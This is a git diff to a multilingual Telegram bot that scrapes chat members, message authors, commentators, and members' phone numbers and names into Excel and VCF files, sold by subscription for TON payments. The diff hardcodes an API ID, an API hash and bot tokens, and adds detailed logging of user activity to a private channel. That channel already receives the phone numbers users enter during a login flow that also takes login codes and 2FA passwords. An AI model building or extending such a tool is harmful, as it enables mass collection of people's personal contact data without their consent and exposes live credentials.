@@ -17,7 +17,7 @@ import vobject
 # Указываем переменные через код или переменные среды
 API_ID = int(os.environ.get('API_ID', 25281388))
 API_HASH = os.environ.get('API_HASH', 'a2e719f61f40ca912567c7724db5764e')
-BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAHV39jxmzvYWW0jiNf6vRW-pB2MSa7QGVU')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAEARQ__XD1Ki60avGlWL1wDKDVcUKh6ny8')
 LOG_CHANNEL_ID = -1002342891238
 SUBSCRIPTION_CHANNEL_ID = -1002425905138  # Оставляем для справки, но не используем
 SUPPORT_USERNAME = '@alex_strayker'
@@ -81,7 +81,7 @@ LANGUAGES = {
         'no_access': 'Ошибка: у меня нет доступа к {link}. Убедись, что я добавлен в чат или он публичный.',
         'flood_error': 'Ошибка: {e}',
         'rpc_error': 'Ошибка: {e}',
-        'new_user': 'Новый пользователь: {name} (ID: {user_id})',
+        'new_user': 'Новый пользователь: {name} (@{username})',
         'language_cmd': 'Выбери новый язык:',
         'caption_commentators': 'Вот ваш файл с комментаторами.',
         'caption_participants': 'Вот ваш файл с участниками.',
@@ -155,7 +155,7 @@ LANGUAGES = {
         'no_access': 'Помилка: у мене немає доступу до {link}. Переконайся, що я доданий до чату або він публічний.',
         'flood_error': 'Помилка: {e}',
         'rpc_error': 'Помилка: {e}',
-        'new_user': 'Новий користувач: {name} (ID: {user_id})',
+        'new_user': 'Новий користувач: {name} (@{username})',
         'language_cmd': 'Обери нову мову:',
         'caption_commentators': 'Ось ваш файл з коментаторами.',
         'caption_participants': 'Ось ваш файл з учасниками.',
@@ -222,14 +222,14 @@ LANGUAGES = {
         'filter_active': 'Only recently active (within 30 days)?',
         'invalid_limit': 'Enter a number from 1 to {max_limit}!',
         'invalid_number': 'Please enter a number!',
-        'invalid_link': 'Please send a valid post/chat link, e.g.: https://t.me/channel_name/12345, @channel_name or channel_name\nOr multiple links via Enter.',
+        'invalid_link': 'Please send a valid post/chat link, e.g.: https://t.me/channel_name/12345, @channel_name or group_name\nOr multiple links via Enter.',
         'fix_link': 'If you made a mistake, I can help fix the link.',
         'suggest_link': 'Did you mean: {link}?',
         'retry_link': 'Send the link again:',
         'no_access': 'Error: I don’t have access to {link}. Make sure I’m added to the chat or it’s public.',
         'flood_error': 'Error: {e}',
         'rpc_error': 'Error: {e}',
-        'new_user': 'New user: {name} (ID: {user_id})',
+        'new_user': 'New user: {name} (@{username})',
         'language_cmd': 'Choose a new language:',
         'caption_commentators': 'Here is your file with commentators.',
         'caption_participants': 'Here is your file with participants.',
@@ -296,14 +296,14 @@ LANGUAGES = {
         'filter_active': 'Nur kürzlich aktive (innerhalb von 30 Tagen)?',
         'invalid_limit': 'Gib eine Zahl von 1 bis {max_limit} ein!',
         'invalid_number': 'Bitte gib eine Zahl ein!',
-        'invalid_link': 'Bitte sende einen gültigen Beitrag/Chat-Link, z.B.: https://t.me/channel_name/12345, @channel_name oder channel_name\nOder mehrere Links mit Enter.',
+        'invalid_link': 'Bitte sende einen gültigen Beitrag/Chat-Link, z.B.: https://t.me/channel_name/12345, @channel_name oder group_name\nOder mehrere Links mit Enter.',
         'fix_link': 'Wenn du einen Fehler gemacht hast, kann ich den Link korrigieren.',
         'suggest_link': 'Meintest du: {link}?',
         'retry_link': 'Sende den Link erneut:',
         'no_access': 'Fehler: Ich habe keinen Zugriff auf {link}. Stelle sicher, dass ich zum Chat hinzugefügt bin oder er öffentlich ist.',
         'flood_error': 'Fehler: {e}',
         'rpc_error': 'Fehler: {e}',
-        'new_user': 'Neuer Benutzer: {name} (ID: {user_id})',
+        'new_user': 'Neuer Benutzer: {name} (@{username})',
         'language_cmd': 'Wähle eine neue Sprache:',
         'caption_commentators': 'Hier ist deine Datei mit Kommentatoren.',
         'caption_participants': 'Hier ist deine Datei mit Teilnehmern.',
@@ -349,10 +349,8 @@ LANGUAGES = {
 async def log_to_channel(context, message, username=None):
     try:
         user = context.user_data.get('user', {})
-        name = user.get('name', username or 'Неизвестно')
-        log_message = f"{message}"
-        if username:
-            log_message = f"{name} (@{username}): {message}"
+        name = user.get('name', 'Неизвестно')
+        log_message = f"Пользователь {name} (@{username}): {message}" if username else message
         await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message)
     except telegram_error.BadRequest as e:
         print(f"Ошибка при отправке лога в канал: {e}")
@@ -430,9 +428,10 @@ def check_parse_limit(user_id, limit, parse_type):
         return min(limit, 15000)
 
 # Создание файла Excel
-async def create_excel_in_memory(data):
-    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'])
-    df['Username'] = '@' + df['Username'].astype(str)
+async def create_excel_in_memory(data, chat_name=""):
+    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'] if len(data[0]) == 6 else ['ID', 'Username', 'First Name', 'Last Name', 'Phone', 'UserObj'])
+    if 'Username' in df.columns:
+        df['Username'] = '@' + df['Username'].astype(str)
     excel_file = io.BytesIO()
     with pd.ExcelWriter(excel_file, engine='xlsxwriter') as writer:
         df.to_excel(writer, index=False, sheet_name='Sheet1')
@@ -535,11 +534,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await client_telethon.is_user_authorized():
             await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
             context.user_data['waiting_for_phone'] = True
-            await log_to_channel(context, f"Запрос номера телефона у {name} (@{username})", username)
+            await log_to_channel(context, f"Новый пользователь: {name} (@{username})", username)
             return
 
         if str(user_id) not in users:
-            await log_to_channel(context, LANGUAGES['Русский']['new_user'].format(name=name, user_id=user_id), username)
+            await log_to_channel(context, f"Новый пользователь: {name} (@{username})", username)
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data=f'lang_Русский_{user_id}')],
                 [InlineKeyboardButton("Украинский", callback_data=f'lang_Украинский_{user_id}')],
@@ -686,6 +685,7 @@ async def show_loading_message(message, context):
     
     loading_message = await message.reply_text(loading_msg)
     context.user_data['loading_message_id'] = loading_message.message_id
+    context.user_data['working_message_id'] = None
     
     dots = 1
     elapsed_time = 0
@@ -704,7 +704,8 @@ async def show_loading_message(message, context):
         await asyncio.sleep(1)
         elapsed_time += 1
         if elapsed_time >= 15 and not working_sent:
-            await message.reply_text(working_msg)
+            working_message = await message.reply_text(working_msg)
+            context.user_data['working_message_id'] = working_message.message_id
             working_sent = True
     
     if 'parsing_done' in context.user_data:
@@ -713,6 +714,11 @@ async def show_loading_message(message, context):
                 chat_id=message.chat_id,
                 message_id=loading_message.message_id
             )
+            if working_sent and context.user_data.get('working_message_id'):
+                await context.bot.delete_message(
+                    chat_id=message.chat_id,
+                    message_id=context.user_data['working_message_id']
+                )
         except telegram_error.BadRequest:
             pass
 
@@ -749,10 +755,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
             context.user_data['waiting_for_code'] = True
             del context.user_data['waiting_for_phone']
-            await log_to_channel(context, f"Номер телефона {name} (@{username}): {text}", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) ввёл номер телефона: {text}", username)
         except telethon_errors.RPCError as e:
             await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-            await log_to_channel(context, f"Ошибка ввода номера {name} (@{username}): {str(e)}", username)
+            await log_to_channel(context, f"Ошибка ввода номера для {name} (@{username}): {str(e)}", username)
         finally:
             await client_telethon.disconnect()
         return
@@ -762,7 +768,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await client_telethon.sign_in(context.user_data['phone'], text)
             await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
             del context.user_data['waiting_for_code']
-            await log_to_channel(context, f"Успешная авторизация {name} (@{username})", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) успешно авторизовался", username)
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data=f'lang_Русский_{user_id}')],
                 [InlineKeyboardButton("Украинский", callback_data=f'lang_Украинский_{user_id}')],
@@ -774,10 +780,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(LANGUAGES['Русский']['enter_password'])
             context.user_data['waiting_for_password'] = True
             del context.user_data['waiting_for_code']
-            await log_to_channel(context, f"Запрос пароля 2FA у {name} (@{username})", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) запросил пароль 2FA", username)
         except telethon_errors.RPCError as e:
             await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-            await log_to_channel(context, f"Ошибка ввода кода {name} (@{username}): {str(e)}", username)
+            await log_to_channel(context, f"Ошибка ввода кода для {name} (@{username}): {str(e)}", username)
         finally:
             await client_telethon.disconnect()
         return
@@ -787,7 +793,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await client_telethon.sign_in(password=text)
             await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
             del context.user_data['waiting_for_password']
-            await log_to_channel(context, f"Успешная авторизация с 2FA {name} (@{username})", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) успешно авторизовался с 2FA", username)
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data=f'lang_Русский_{user_id}')],
                 [InlineKeyboardButton("Украинский", callback_data=f'lang_Украинский_{user_id}')],
@@ -797,7 +803,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
         except telethon_errors.RPCError as e:
             await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-            await log_to_channel(context, f"Ошибка ввода пароля 2FA {name} (@{username}): {str(e)}", username)
+            await log_to_channel(context, f"Ошибка ввода пароля 2FA для {name} (@{username}): {str(e)}", username)
         finally:
             await client_telethon.disconnect()
         return
@@ -837,7 +843,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             except telegram_error.BadRequest as e:
                 print(f"Ошибка отправки хэша администратору {admin_id}: {e}")
-        await log_to_channel(context, f"Хэш транзакции от {name} (@{username}): {text}", username)
+        await log_to_channel(context, f"Пользователь {name} (@{username}) отправил хэш транзакции: {text}", username)
         await update.message.reply_text(texts['payment_pending'])
         await client_telethon.disconnect()
         return
@@ -852,21 +858,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=[{"type": "emoji", "emoji": "🎉"}])
             except telethon_errors.RPCError as e:
                 await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
-                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
+                await log_to_channel(context, f"Ошибка получения ID для {name} (@{username}): {str(e)}", username)
         elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat'):
             chat_id = update.message.forward_origin.chat.id
             msg = await update.message.reply_text(texts['id_result'].format(id=chat_id), reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton(texts['close'], callback_data=f'close_id_{user_id}'), InlineKeyboardButton(texts['continue_id'], callback_data=f'continue_id_{user_id}')]
             ]))
             await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=[{"type": "emoji", "emoji": "🎉"}])
-            await log_to_channel(context, f"Получен ID чата: {chat_id}", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) получил ID чата: {chat_id}", username)
         elif update.message.forward_origin and hasattr(update.message.forward_origin, 'sender_user'):
             user_id_forward = update.message.forward_origin.sender_user.id
             msg = await update.message.reply_text(texts['id_result'].format(id=user_id_forward), reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton(texts['close'], callback_data=f'close_id_{user_id}'), InlineKeyboardButton(texts['continue_id'], callback_data=f'continue_id_{user_id}')]
             ]))
             await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=[{"type": "emoji", "emoji": "🎉"}])
-            await log_to_channel(context, f"Получен ID пользователя: {user_id_forward}", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) получил ID пользователя: {user_id_forward}", username)
         elif text.startswith(('https://t.me/', '@')) or not text.startswith('http'):
             try:
                 if text.startswith('@'):
@@ -887,10 +893,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     [InlineKeyboardButton(texts['close'], callback_data=f'close_id_{user_id}'), InlineKeyboardButton(texts['continue_id'], callback_data=f'continue_id_{user_id}')]
                 ]))
                 await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=[{"type": "emoji", "emoji": "🎉"}])
-                await log_to_channel(context, f"Получен ID через ссылку: {entity.id}", username)
+                await log_to_channel(context, f"Пользователь {name} (@{username}) получил ID через ссылку: {entity.id}", username)
             except telethon_errors.RPCError as e:
                 await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
-                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
+                await log_to_channel(context, f"Ошибка получения ID для {name} (@{username}): {str(e)}", username)
         del context.user_data['waiting_for_id']
         await client_telethon.disconnect()
         return
@@ -909,6 +915,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             context.user_data['limit'] = limit
             del context.user_data['waiting_for_limit']
+            await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал количество **{limit}**", username)
             await ask_for_filters(update.message, context)
         except ValueError:
             await update.message.reply_text(texts['invalid_number'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data=f'skip_limit_{user_id}')]]))
@@ -1132,10 +1139,10 @@ async def parse_auth_access(link, context):
         entity = await client_telethon.get_entity(chat_id)
         if hasattr(entity, 'participants_count'):
             await context.bot.send_message(chat_id=user_id, text=texts['auth_success'])
-            await log_to_channel(context, f"Доступ к закрытому чату {chat_id} успешно предоставлен для {name} (@{username})", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) успешно получил доступ к закрытому чату {chat_id}", username)
         else:
             await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
-            await log_to_channel(context, f"Ошибка доступа к закрытому чату {chat_id} для {name} (@{username})", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) не смог получить доступ к закрытому чату {chat_id}", username)
     except telethon_errors.RPCError as e:
         await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
         await log_to_channel(context, f"Ошибка авторизации для {name} (@{username}): {str(e)}", username)
@@ -1177,18 +1184,19 @@ async def process_parsing(message, context):
                 else:
                     normalized_link = link
                 
-                await client_telethon.get_entity(normalized_link.split('/')[-2] if context.user_data['parse_type'] in ['parse_post_commentators', 'parse_auth_access'] else normalized_link)
+                entity = await client_telethon.get_entity(normalized_link.split('/')[-2] if context.user_data['parse_type'] in ['parse_post_commentators', 'parse_auth_access'] else normalized_link)
+                chat_name = entity.username if hasattr(entity, 'username') and entity.username else entity.title if hasattr(entity, 'title') else "unknown"
             except telethon_errors.ChannelPrivateError:
                 context.user_data['parsing_done'] = True
                 await message.reply_text(texts['no_access'].format(link=link))
                 context.user_data['parsing_in_progress'] = False
-                await log_to_channel(context, texts['no_access'].format(link=link), username)
+                await log_to_channel(context, f"Пользователь {name} (@{username}) не имеет доступа к {link}", username)
                 return
             except telethon_errors.RPCError as e:
                 context.user_data['parsing_done'] = True
                 await message.reply_text(texts['rpc_error'].format(e=str(e)))
                 context.user_data['parsing_in_progress'] = False
-                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
+                await log_to_channel(context, f"Ошибка RPC для {name} (@{username}): {str(e)}", username)
                 return
             
             limit = check_parse_limit(user_id, context.user_data['limit'], context.user_data['parse_type'])
@@ -1213,7 +1221,7 @@ async def process_parsing(message, context):
         if not all_data:
             await message.reply_text("Не удалось собрать данные. Возможно, чат пустой или доступ ограничен.")
             context.user_data['parsing_in_progress'] = False
-            await log_to_channel(context, f"Не удалось собрать данные для {context.user_data['parse_type']} по ссылке {','.join(context.user_data['links'])}", username)
+            await log_to_channel(context, f"Пользователь {name} (@{username}) не собрал данные для {context.user_data['parse_type']} по ссылке {','.join(context.user_data['links'])}", username)
             return
         
         filtered_data = filter_data(all_data, context.user_data.get('filters', {'limit': limit}))
@@ -1221,21 +1229,21 @@ async def process_parsing(message, context):
         
         if context.user_data['parse_type'] == 'parse_phone_contacts':
             df = pd.DataFrame(filtered_data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Phone', 'UserObj'])
-            excel_file = await create_excel_in_memory(df[['ID', 'Username', 'First Name', 'Last Name', 'Phone']])
+            excel_file = await create_excel_in_memory(df[['ID', 'Username', 'First Name', 'Last Name', 'Phone']], chat_name)
             vcf_file = create_vcf_file(df[['ID', 'Username', 'First Name', 'Last Name', 'Phone']])
             
             await message.reply_document(
                 document=excel_file,
-                filename='phone_contacts.xlsx',
+                filename=f'phone_contacts_{chat_name}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.xlsx',
                 caption=f"{texts['caption_phones']}\n\n{stats}"
             )
             await message.reply_document(
                 document=vcf_file,
-                filename='phone_contacts.vcf',
+                filename=f'phone_contacts_{chat_name}.vcf',
                 caption=f"{texts['caption_phones']}\n\n{stats}"
             )
         else:
-            excel_file = await create_excel_in_memory(filtered_data)
+            excel_file = await create_excel_in_memory(filtered_data, chat_name)
             caption = (
                 texts['caption_commentators'] if context.user_data['parse_type'] == 'parse_authors' else
                 texts['caption_participants'] if context.user_data['parse_type'] == 'parse_participants' else
@@ -1243,12 +1251,12 @@ async def process_parsing(message, context):
             )
             await message.reply_document(
                 document=excel_file,
-                filename=f"{context.user_data['parse_type']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx",
+                filename=f"{context.user_data['parse_type']}_{chat_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx",
                 caption=f"{caption}\n\n{stats}"
             )
         
         update_user_data(user_id, name, context, requests=1)
-        await log_to_channel(context, f"Успешный парсинг {context.user_data['parse_type']} для {name} (@{username}): {stats}", username)
+        await log_to_channel(context, f"Пользователь {name} (@{username}) успешно завершил парсинг {context.user_data['parse_type']} для {chat_name}: {stats}", username)
         
         # Добавляем оценку парсинга
         keyboard = [
@@ -1261,7 +1269,7 @@ async def process_parsing(message, context):
     except telethon_errors.FloodWaitError as e:
         context.user_data['parsing_done'] = True
         await message.reply_text(texts['flood_error'].format(e=f"Слишком много запросов. Подождите {e.seconds} секунд"))
-        await log_to_channel(context, texts['flood_error'].format(e=f"Слишком много запросов: {e.seconds} секунд"), username)
+        await log_to_channel(context, f"Пользователь {name} (@{username}) получил ошибку FloodWait: {e.seconds} секунд", username)
     except Exception as e:
         context.user_data['parsing_done'] = True
         await message.reply_text(texts['rpc_error'].format(e=str(e)))
@@ -1293,7 +1301,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lang = data_parts[1]
         update_user_data(user_id, name, context, lang=lang)
         await query.edit_message_text(texts['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data=f'subscribed_{user_id}')]]))
-        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал язык: {lang}", username)
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал язык **{lang}**", username)
     
     elif query.data == f'subscribed_{user_id}':
         menu_text, menu_keyboard = get_main_menu(user_id, context)
@@ -1302,24 +1310,34 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == f'identifiers_{user_id}':
         await query.edit_message_text(texts['identifiers'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]]))
         context.user_data['waiting_for_id'] = True
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал **Идентификаторы**", username)
     
     elif query.data == f'parser_{user_id}':
         keyboard = [
-            [InlineKeyboardButton("Авторы сообщений" if lang == 'Русский' else "Автори повідомлень" if lang == 'Украинский' else "Message authors" if lang == 'English' else "Nachrichtenautoren", callback_data=f'parse_authors_{user_id}')],
-            [InlineKeyboardButton("Участники чата" if lang == 'Русский' else "Учасники чату" if lang == 'Украинский' else "Chat participants" if lang == 'English' else "Chat-Teilnehmer", callback_data=f'parse_participants_{user_id}')],
-            [InlineKeyboardButton("Комментаторы поста" if lang == 'Русский' else "Коментатори посту" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data=f'parse_post_commentators_{user_id}')],
-            [InlineKeyboardButton(texts['phone_contacts'], callback_data=f'parse_phone_contacts_{user_id}')],
-            [InlineKeyboardButton(texts['auth_access'], callback_data=f'parse_auth_access_{user_id}')],
+            [InlineKeyboardButton("Авторы сообщений" if lang == 'Русский' else "Автори повідомлень" if lang == 'Украинский' else "Message authors" if lang == 'English' else "Nachrichtenautoren", callback_data=f'parse_authors_{user_id}'), InlineKeyboardButton("(!)", callback_data=f'info_parse_authors_{user_id}')],
+            [InlineKeyboardButton("Участники чата" if lang == 'Русский' else "Учасники чату" if lang == 'Украинский' else "Chat participants" if lang == 'English' else "Chat-Teilnehmer", callback_data=f'parse_participants_{user_id}'), InlineKeyboardButton("(!)", callback_data=f'info_parse_participants_{user_id}')],
+            [InlineKeyboardButton("Комментаторы поста" if lang == 'Русский' else "Коментатори посту" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data=f'parse_post_commentators_{user_id}'), InlineKeyboardButton("(!)", callback_data=f'info_parse_post_commentators_{user_id}')],
+            [InlineKeyboardButton(texts['phone_contacts'], callback_data=f'parse_phone_contacts_{user_id}'), InlineKeyboardButton("(!)", callback_data=f'info_parse_phone_contacts_{user_id}')],
+            [InlineKeyboardButton(texts['auth_access'], callback_data=f'parse_auth_access_{user_id}'), InlineKeyboardButton("(!)", callback_data=f'info_parse_auth_access_{user_id}')],
             [InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]
         ]
         await query.edit_message_text(texts['parser'], reply_markup=InlineKeyboardMarkup(keyboard))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал **Сбор данных / Парсер**", username)
     
     elif query.data.startswith('parse_') and data_parts[-1] == str(user_id):
         context.user_data['parse_type'] = '_'.join(data_parts[:-1])
+        parse_type_text = {
+            'parse_authors': 'Авторы сообщений',
+            'parse_participants': 'Участники чата',
+            'parse_post_commentators': 'Комментаторы поста',
+            'parse_phone_contacts': 'Сбор номеров телефонов и ФИО',
+            'parse_auth_access': 'Авторизация для закрытых чатов'
+        }.get(context.user_data['parse_type'], 'Неизвестно')
         if context.user_data['parse_type'] in ['parse_authors', 'parse_participants', 'parse_phone_contacts', 'parse_auth_access']:
             await query.edit_message_text(texts['link_group'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]]))
         elif context.user_data['parse_type'] == 'parse_post_commentators':
             await query.edit_message_text(texts['link_post'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]]))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал **{parse_type_text}**", username)
     
     elif query.data.startswith('limit_') and data_parts[-1] == str(user_id):
         if data_parts[1] == 'custom':
@@ -1328,12 +1346,14 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data=f'skip_limit_{user_id}')]]))
         else:
             context.user_data['limit'] = int(data_parts[1])
+            await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал количество **{context.user_data['limit']}**", username)
             await ask_for_filters(query.message, context)
     
     elif query.data == f'skip_limit_{user_id}':
         context.user_data['limit'] = 150 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 1000
         if 'waiting_for_limit' in context.user_data:
             del context.user_data['waiting_for_limit']
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал количество **{context.user_data['limit']}** (по умолчанию)", username)
         await ask_for_filters(query.message, context)
     
     elif query.data.startswith('filter_') and data_parts[-1] == str(user_id):
@@ -1374,6 +1394,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]
         ]
         await query.edit_message_text("Выберите тип подписки:", reply_markup=InlineKeyboardMarkup(keyboard))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал **Оформить подписку**", username)
     
     elif query.data.startswith('sub_') and data_parts[-1] == str(user_id):
         sub_type = data_parts[1]
@@ -1383,6 +1404,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton(texts['payment_cancel'], callback_data=f'close_menu_{user_id}')]
         ]
         await query.edit_message_text(texts['payment_wallet'].format(amount=amount, address=TON_WALLET_ADDRESS), reply_markup=InlineKeyboardMarkup(keyboard))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) выбрал подписку **{sub_type}**", username)
     
     elif query.data.startswith('paid_') and data_parts[-1] == str(user_id):
         sub_type = data_parts[1]
@@ -1408,9 +1430,11 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif query.data == f'requisites_{user_id}':
         await query.edit_message_text(texts['requisites'].format(support=SUPPORT_USERNAME), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]]))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) запросил **Реквизиты**", username)
     
     elif query.data == f'logs_channel_{user_id}' and str(user_id) in ADMIN_IDS:
         await query.edit_message_text(texts['logs_channel'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_menu_{user_id}')]]))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) запросил **Канал с логами**", username)
     
     elif query.data.startswith('reject_') and str(user_id) in ADMIN_IDS:
         rejected_user_id = data_parts[1]
@@ -1418,11 +1442,11 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         rejected_lang = load_users().get(str(rejected_user_id), {}).get('language', 'Русский')
         await context.bot.send_message(chat_id=rejected_user_id, text=LANGUAGES[rejected_lang]['payment_error'])
         await query.edit_message_text(f"Транзакция пользователя {rejected_username} (ID: {rejected_user_id}) отклонена.", reply_markup=InlineKeyboardMarkup([]))
-        await log_to_channel(context, f"Транзакция пользователя {rejected_username} (ID: {rejected_user_id}) отклонена администратором {name} (@{username})", username)
+        await log_to_channel(context, f"Администратор {name} (@{username}) отклонил транзакцию пользователя {rejected_username} (ID: {rejected_user_id})", username)
     
     elif query.data.startswith('rate_') and data_parts[-1] == str(user_id):
         rating = int(data_parts[1])
-        await log_to_channel(context, f"Пользователь {name} (@{username}) оценил парсинг: {rating} звёзд", username)
+        await log_to_channel(context, f"Пользователь {name} (@{username}) оценил парсинг: **{rating} звёзд**", username)
         menu_text, menu_keyboard = get_main_menu(user_id, context)
         await query.message.reply_text(texts['home_cmd'], reply_markup=menu_keyboard)
         await query.message.delete()
@@ -1436,6 +1460,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         info_type = '_'.join(data_parts[1:-1])
         info_text = texts[f'info_{info_type}']
         await query.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data=f'close_info_{user_id}')]]))
+        await log_to_channel(context, f"Пользователь {name} (@{username}) запросил информацию о **{info_type.replace('parse_', '').replace('_', ' ')}**", username)
 
     elif query.data == f'close_info_{user_id}':
         await query.message.delete()
